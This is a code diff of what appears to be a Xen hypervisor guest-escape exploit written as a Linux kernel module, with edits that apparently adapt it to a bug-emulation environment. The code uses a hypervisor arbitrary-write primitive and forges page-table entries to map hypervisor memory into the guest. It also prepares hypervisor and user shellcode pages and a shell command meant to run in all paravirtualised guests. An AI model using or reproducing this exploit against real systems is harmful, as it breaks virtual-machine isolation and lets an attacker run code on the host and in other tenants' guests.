@@ -55,16 +55,49 @@ void page_walk(unsigned long va)
 	pte_t *pte;
 	struct mm_struct *mm = current->mm;
 
+
+
+    printk("Page Walk for va %p\n", (void *) va);
+
 	pgd = pgd_offset(mm, va);
-	pud = pud_offset(pgd, va);
-	pmd = pmd_offset(pud, va);
-	pte = pte_offset_kernel(pmd, va);
+    if (pgd_none(*pgd)){
+        printk("pgd none!\n");
+        return;
+    }
+    if (pgd_bad(*pgd)){
+        printk("pgd bad!\n");
+        return;
+    }
 	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
+
+	pud = pud_offset(pgd, va);
+    if (pud_none(*pud)){
+        printk("pud none!\n");
+        return;
+    }
+    if (pud_bad(*pud)){
+        printk("pud bad!\n");
+        return;
+    }
 	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
+
+	pmd = pmd_offset(pud, va);
+    if (pmd_none(*pmd)){
+        printk("pmd none!\n");
+        return;
+    }
+    if (pmd_bad(*pmd)){
+        printk("pmd bad!\n");
+        return;
+    }
 	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
+	pte = pte_offset_kernel(pmd, va);
+    if (!pte){
+        printk("PTE not present!\n");
+        return;
+    }
 	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
 }
-
 
 
 unsigned long read_idt_addr(void) {
@@ -73,8 +106,26 @@ unsigned long read_idt_addr(void) {
   return dtr.address;
 }
 
+/* virtual memory:
+ *   user-pinned:  0x0000600000000000 - 0x0000600000000fff
+ *   mapped by us: 0x0000600040000000 - 0x000060007fffffff (we map this using the bug, but unmap it as soon as we can)
+ *   clobbered:    0x0000600080000000 - 0x00006000bfffffff
+ *   mapped by us: 0xffff804000000000 - 0xffff80403fffffff (directly usable, but won't work from user ctx)
+ *   mapped by us: 0xffff82d0c0000000 - 0xffff82d0ffffffff (inaccessible from guest ctx by default)
+ */
+static u64 MY_SECOND_AREA;
+#define MY_SECOND_AREA_ADDR 0xffff804000000000ULL
+//#define MY_SECOND_AREA 0x00006000c0000000ULL
+static u64 MY_THIRD_AREA;
+#define MY_THIRD_AREA_ADDR  0xffff82d0c0000000ULL
+#define HV_SHELLCODE_ADDR (MY_THIRD_AREA + 0x1000)
+
 static int init_test(void) {
   long scp_res;
+
+
+
+
 
   slow_print("call_int_85 at 0x%p\n", call_int_85);
   slow_print("backstop_85_handler at 0x%p\n", backstop_85_handler);
@@ -189,7 +240,7 @@ static int try_write_byte_hyper(u8 *dst, u8 val) {
           args.out.extent_start + 8 * args.nr_exchanged,
           &content,
           sizeof(u64),
-          ARBITRARY_WRITE_LINEAR
+          ARBITRARY_WRITE
 
   );
   if (ret) {
@@ -328,18 +379,6 @@ void set_backstop_85_handler(void *info) {
 static unsigned long idt_addrs[MAX_PHYS_CORES];
 static struct idt_entry *idt_85_remapped_addrs[MAX_PHYS_CORES];
 
-/* virtual memory:
- *   user-pinned:  0x0000600000000000 - 0x0000600000000fff
- *   mapped by us: 0x0000600040000000 - 0x000060007fffffff (we map this using the bug, but unmap it as soon as we can)
- *   clobbered:    0x0000600080000000 - 0x00006000bfffffff
- *   mapped by us: 0xffff804000000000 - 0xffff80403fffffff (directly usable, but won't work from user ctx)
- *   mapped by us: 0xffff82d0c0000000 - 0xffff82d0ffffffff (inaccessible from guest ctx by default)
- */
-//#define MY_SECOND_AREA 0xffff804000000000ULL
-#define MY_SECOND_AREA 0xffff805000000000ULL
-//#define MY_SECOND_AREA 0xffff82d0d0000000ULL
-#define MY_THIRD_AREA  0xffff82d0c0000000ULL
-#define HV_SHELLCODE_ADDR (MY_THIRD_AREA + 0x1000)
 
 static void maybe_set_cur_physcpu_idt_entry(u64 **scratch_pt_entry, u8 **scratch_vaddr) {
   int i;
@@ -413,6 +452,35 @@ static void cleanup_test(void) {
   u8 *user_shellcode_page = (void*)__get_free_pages(GFP_KERNEL, 0);
   u64 *my_pmd = (void*)__get_free_pages(GFP_KERNEL, 0);
   u64 *my_pt = (void*)__get_free_pages(GFP_KERNEL, 0);
+  
+  // code to adapt to EFFECTOR
+  slow_print("Allocating the the placeholder pages\n");
+  MY_SECOND_AREA = __get_free_pages(GFP_KERNEL, 0);
+  MY_THIRD_AREA = __get_free_pages(GFP_KERNEL, 0);
+
+  /*
+  
+  slow_print("MY_SECOND_AREA = %llx\n ", (u64) MY_SECOND_AREA);
+  page_walk(MY_SECOND_AREA);
+
+  slow_print("Forcing the remap of the va of MY_SECOND_AREA %p\n",(void*)MY_SECOND_AREA);
+  HYPERVISOR_faulty_update_va_mapping((unsigned long) MY_SECOND_AREA, MY_SECOND_AREA_ADDR,0);
+
+  slow_print("MY_SECOND_AREA = %llx\n ", (u64) MY_SECOND_AREA);
+  page_walk((unsigned long) MY_SECOND_AREA);
+
+
+  slow_print("MY_THIRD_AREA = %llx\n ", (u64) MY_THIRD_AREA);
+  page_walk((unsigned long) MY_THIRD_AREA);
+
+  slow_print("Forcing the remap of the va of MY_THIRD_AREA %p\n",(void*)MY_THIRD_AREA);
+  HYPERVISOR_faulty_update_va_mapping((unsigned long) MY_THIRD_AREA, MY_THIRD_AREA_ADDR,0);
+
+  slow_print("MY_THIRD_AREA = %llx\n ", (u64) MY_THIRD_AREA);
+  page_walk((unsigned long) MY_THIRD_AREA);
+
+  
+  */
 
   if (!hv_shellcode_page || !user_shellcode_page || !my_pmd || !my_pt) {
     slow_print("OOM");
@@ -430,6 +498,7 @@ static void cleanup_test(void) {
   /* misc debug output */
   slow_print("PML4 at %p\n", current->mm->pgd);
   page_walk((unsigned long) current->mm->pgd);
+  slow_print("Page Walk from the pdf_offset of MY_SECOND_AREA\n");
   slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
   slow_print("PML4 THIRD entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_THIRD_AREA)));
   slow_print("PML4 entry for my_pt: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, (unsigned long) my_pt)));
@@ -457,38 +526,54 @@ static void cleanup_test(void) {
   /* shell command to run in all PV guests */
   my_pt[6] = (0x5 | virt_to_machine(shell_command_page).maddr);
 
+  /* *
+   * A sign that the bug is not in the bug emulation is the inability to 
+   * page_walk from here but being able to do so after the set_pud_entry(...)
+   */
+
   /* set up temporary mapping through a guest userspace address */
-  //slow_print("Printing the mapping before  0x0000600040000000");
-  //page_walk(0x0000600040000000);
+  slow_print("Printing the mapping before  0x0000600040000000");
+  page_walk(0x0000600040000000);
   set_pud_entry(user_pud, virt_to_machine(my_pmd).maddr);
-  slow_print("Printing the mapping after 0x0000600040000000");
+  slow_print("Printing the mapping after 0x0000600040000000\n");
   page_walk(0x0000600040000000);
   barrier();
+  return;
+
 
   /* put a reference to our PMD into the target PUD */
   slow_print("dummy\n");
   slow_print("going to link PMD into target PUD\n");
-  slow_print("PMD addres %llx (plus flags %llx\n", virt_to_machine(my_pmd).maddr,(0x7 | virt_to_machine(my_pmd).maddr));
+  slow_print("PMD addres %llx (plus flags %llx)\n", virt_to_machine(my_pmd).maddr,(0x7 | virt_to_machine(my_pmd).maddr));
   ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
+  slow_print(" ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] =  %llx\n", ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] );
+
   barrier();
   slow_print("linked PMD into target PUD\n");
 
   /* remove the mapping in guest userspace, together with garbage behind it */
   slow_print("going to unlink mapping via userspace PUD\n");
-  //slow_print("forcing quit");
-  //return;
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000)) : %p\n",((u64*)(MY_SECOND_AREA+0x3000)));
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[1] : %llx\n",((u64*)(MY_SECOND_AREA+0x3000))[1]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[2] : %llx\n",((u64*)(MY_SECOND_AREA+0x3000))[2]);
   ((u64*)(MY_SECOND_AREA+0x3000))[1] = 0;
   ((u64*)(MY_SECOND_AREA+0x3000))[2] = 0;
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000)) : %p\n",((u64*)(MY_SECOND_AREA+0x3000)));
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[1] : %llx\n",((u64*)(MY_SECOND_AREA+0x3000))[1]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[2] : %llx\n",((u64*)(MY_SECOND_AREA+0x3000))[2]);
   slow_print("mapping unlink done\n");
   barrier();
 
   /* we have 256 pt entries reserved for scratch allocs */
   scratch_pt_entry = my_pt + 256;
   scratch_vaddr = (void*)(MY_SECOND_AREA + 256 * 0x1000UL);
+  //slow_print("forcing quit");
+  //return;
 
   /* also map into MY_THIRD_AREA */
   ((u64*)(MY_SECOND_AREA + 0x5000))[pud_index(MY_THIRD_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
   barrier();
+  slow_print("mapping third area done\n");
 
   /* prepare shellcode pages */
   if (sizeof(hv_shellcode) > 0x1000 || sizeof(user_shellcode) > 0x1000) {
